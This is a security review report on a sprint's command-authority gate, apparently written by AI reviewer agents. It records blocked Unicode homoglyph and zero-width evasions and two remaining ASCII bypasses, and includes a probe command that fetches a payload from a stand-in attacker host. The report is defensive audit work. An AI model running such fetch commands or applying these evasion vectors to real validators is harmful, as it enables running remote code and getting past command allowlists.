# Red-Hat Review Report — Sprint 04 Trust Pipeline

**Report Date:** 2026-07-23T05:40:20Z  
**Target:** `.spec/prds/route-agent-quality/tasks/sprint-04-trust-pipeline`  
**Reviewed HEAD:** `99b4c710d0bb5ff20e64f6daa6c776fbf499d43e`  
**Scope:** REDHAT-FIX-27 command-authority closure; regression confirmation of REDHAT-FIX-17..26.  
**Reviewed by:** primary red-hat reviewer, `convex-reviewer` (independent), `test-quality-reviewer` (standing test-reality lens).  
**Test-reality lens:** ran in implemented mode.

## Executive Summary

**FIX-27 closes its stated Unicode/marker-obfuscation hole.** At the reviewed HEAD, every requested non-ASCII command vector returns `OFF_PLAN_SCRIPT`; this includes Cyrillic marker substitutions, U+200B and U+FEFF, full-width punctuation, non-ASCII paths and arguments, and arbitrary non-ASCII commands with no gate marker. The exact planned ASCII command is accepted on the *current timestamp-shaped-script axis*, and the focused REDHAT-FIX-17..27 suites passed individually (53 tests).

**The trust/couch gate control plane is NOT severity-CLEAN of CRITICAL/HIGH.** One new **HIGH** command-authority bypass remains: arbitrary ASCII `repro_cmd` values that are not plan commands are accepted whenever they do not look like a timestamp-shaped `.gate-evidence` script. The same flaw accepts ASCII formatting aliases (e.g. double leading/inter-token/trailing spaces) for the plan command. Therefore the requested “exact ASCII plan command is the sole accepted representation” property is not met. S4-T7 is correctly external and BLOCKED; it is not a code finding.

## Prompt-to-Artifact Completion Checklist

| Requirement | Evidence | Verdict |
|---|---|---|
| Cyrillic `е` in `.gatе-evidence` / `.gate-evidеnce` rejects | FIX-27 AC-1 passed; direct matrix returned `OFF_PLAN_SCRIPT` for both | PASS |
| Cyrillic `һ` in `.sһ`; non-ASCII script-path segment rejects | FIX-27 AC-2 passed; direct matrix returned `OFF_PLAN_SCRIPT` | PASS |
| U+200B / U+FEFF inside marker; full-width `．` / `／` reject | FIX-27 AC-3 plus direct U+FEFF matrix: all `OFF_PLAN_SCRIPT` | PASS |
| Non-ASCII args and arbitrary non-ASCII anywhere reject | FIX-27 AC-4; `--label=café`, `echo 中文`, and no-marker paths all rejected | PASS |
| Exact planned ASCII command accepts; FIX-24/25/26 attack regressions reject | FIX-27 AC-5; exact command accepted; extra flag/env/interpreter/metachar/NBSP rejected | PARTIAL — ASCII aliases are also accepted; arbitrary ASCII commands are accepted |
| FIX-17..26 regression confirmation | Each suite run separately: 48 tests passed (FIX-17=4, 18=5, 19=4, 20=6, 21=5, 22=4, 23=6, 24=4, 25=5, 26=5) | PASS |
| FIX-27 suite and declared validation gates | 5/5 FIX-27 tests passed; `tsc`, Biome, and scenario validator passed | PASS |
| Human gate status handled honestly | `sprint-goal-state.json`: `GATE-GOAL: BLOCKED`, `met:false`; scripts 1–8 exist. S4-T7 remains human-owned. | PASS / not a finding |

## HIGH Severity Findings

- [ ] **H-1 — ASCII commands outside the canonical plan are silently accepted.**
  - **Confidence:** HIGH (independently reproduced; independent `convex-reviewer` reported the same seam).
  - **Evidence:** `tools/gate/deriveGoalState.ts:783-804` performs full-command equality only if `isTimestampShapedScriptPath(text) || mentionsTimestampShapedScript(text)`. Otherwise `checkText()` returns `null`. `substantiateSteps()` at `:241-268` checks only the step result and manifest artifact presence, never the `repro_cmd`.
  - **Reproduction:** an isolated temp repository with a committed HEAD-bound 1..8 plan and a complete, committed, fresh 1..8 evidence manifest accepted step 1 `repro_cmd: "echo approved-but-unplanned"`: `deriveGoalState` returned `error:null` (only the expected unavailable durable founder source kept `met:false`). The direct command matrix also accepted `echo approved-but-unplanned` and `curl https://attacker.invalid/payload` (`code:null`).
  - **Impact:** once the other independently protected prerequisites are present, a caller can claim an arbitrary ASCII reproduction command rather than the command authorized in `gate-plan.json`. This defeats command authority for any non-timestamp-shaped ASCII input and violates the requested sole-representation property.
  - **Remediation:** make every non-empty `StepResult.repro_cmd` fail closed unless it exactly maps to that step’s HEAD-bound `literal_cmd` (and decide explicitly whether `bundlePath` is a command-bearing text or a separately constrained repository path). Bind the match per step number, not merely to a set of any plan commands. Add a valid-manifest integration regression for `echo approved-but-unplanned`, `curl …`, and a step-1 command copied from step-2.

- [ ] **H-2 — “Exact ASCII” is normalized rather than byte-exact.**
  - **Confidence:** HIGH (directly reproduced; surfaced by independent `convex-reviewer`).
  - **Evidence:** `tools/gate/deriveGoalState.ts:571-578` uses `text.trim().split(/[ \t\n\r]+/)`, then compares the normalized stable key at `:787-803`.
  - **Reproduction:** both `bash  .gate-evidence/2026-07-21T152805Z/scripts/step1.sh` and leading/trailing-space variants returned `null` / accepted against a one-space plan literal.
  - **Impact:** this is a second breach of the requested exact-ASCII-sole-representation boundary. It is less capable than H-1, but is security-relevant if raw command text is the attestation claim.
  - **Remediation:** compare raw ASCII command bytes to the per-step HEAD-bound `literal_cmd`, or formally document and test the intentionally allowed canonicalization aliases. If aliases are required, constrain them in the plan and include them in the signed/HEAD-bound authority rather than deriving them ad hoc.

## MEDIUM Severity Findings

- [ ] **M-1 — Couch integration suites share a mutable dev deployment.**
  - **Confidence:** MEDIUM.
  - **Evidence:** FIX-19 uses default `CONVEX_DEPLOYMENT=dev:quirky-panther-164` at `convex/__tests__/REDHAT-FIX-19-strict-manifest-binding.integration.test.ts:51-68` and clears/reseeds global state at `:95-122`. FIX-17 similarly rotates active manifests between tests (`convex/__tests__/REDHAT-FIX-17-latest-verdict-revokes-pass.integration.test.ts:180-324`). An independent batch run observed batch-only failures, while this review’s sequential individual runs all passed.
  - **Impact:** cross-file concurrency can create flaky regressions and make green status less reliable.
  - **Remediation:** serialize these deployment-mutating suites in CI or provision isolated deployments/namespaces; do not treat a batch-only failure as an S4-T7 human-gate failure.

## LOW Severity Findings

- [ ] **L-1 — FIX-27 does not itself name U+FEFF inside the marker substring.**
  - **Confidence:** LOW (coverage gap, not a behavior failure).
  - **Evidence:** FIX-27 AC-3 covers U+200B plus U+FF0E/U+FF0F at `convex/__tests__/REDHAT-FIX-27-unconditional-non-ascii-reject.integration.test.ts:239-278`; U+FEFF is covered in FIX-26, not explicitly in the marker-obfuscation suite.
  - **Observed behavior:** the fresh direct U+FEFF-in-marker probe rejected it correctly.
  - **Remediation:** add U+FEFF-in-marker to FIX-27 AC-3 so the specific regression contract is self-contained.

## Confirmed Closures / No Finding

- **FIX-17:** latest bound fail revokes prior pass — individually green (4 tests).
- **FIX-18:** canonical 1..8 completeness and identity validation — individually green (5 tests).
- **FIX-19:** strict manifestHash/catalogVersion binding — individually green (4 tests).
- **FIX-20..23:** honest control surface, immutable HEAD plan authority, exact allowed scripts, usable clean HEAD-bound plan — individually green (21 tests).
- **FIX-24..25:** extra flags, env prefixes, interpreter substitutions, shell metacharacters, controls, and quote/IFS vectors reject — individually green (9 tests).
- **FIX-26:** Unicode separator, zero-width, homoglyph, and blanket non-ASCII rejection — individually green (5 tests).
- **FIX-27:** the prior marker-detection bypass is closed: its raw unconditional `isStrictAscii` branch precedes full-command detection at `tools/gate/deriveGoalState.ts:764-781`; it preserves raw attack text in `details.script`.
- **S4-T7:** correctly remains a human-owned external blocker. No finding is recorded for the honest `met:false` / `GATE-GOAL: BLOCKED` state.

## Verification Log

```text
npx vitest run REDHAT-FIX-17...27 suites individually  -> 11 files, 53 passed
npx tsc --noEmit -p convex/tsconfig.json                -> exit 0
pnpm exec biome check tools/gate/deriveGoalState.ts tools/gate/verifyEvidenceManifest.ts \
  convex/__tests__/REDHAT-FIX-27-unconditional-non-ascii-reject.integration.test.ts -> clean
validate_scenario REDHAT-FIX-27 requirement contract    -> ok:true, scenario_count:5, violations:[]
```

Direct command matrix results:

```text
ACCEPTED: exact planned command; double-space ASCII alias; leading/trailing-space ASCII alias;
          echo approved-but-unplanned; curl https://attacker.invalid/payload
REJECTED (OFF_PLAN_SCRIPT): Cyrillic marker variants, Cyrillic .sһ, U+200B/U+FEFF marker,
          full-width ．/／, non-ASCII path, non-ASCII args, arbitrary CJK command
```

## Agent Reports (Summary)

- **convex-reviewer:** independently found H-1/H-2 and flagged shared-dev test reliability; its runtime requested an unavailable child `task` tool, so its report is retained as partial independent evidence rather than a complete delegated run.
- **test-quality-reviewer:** approved FIX-27’s five AC-level negative controls; mutation probes killed conditional-marker and `isStrictAscii` mutants. It also observed batch-only shared-state instability in FIX-17.

## Verdict

**Needs revision.** FIX-27 specifically is behaviorally closed for the full requested non-ASCII evasion matrix, but the command-authority boundary still has HIGH-severity ASCII bypasses. The trust/couch gate control plane is **not severity-CLEAN of CRITICAL/HIGH** until H-1 and H-2 are resolved and tested against a valid HEAD-bound evidence bundle.
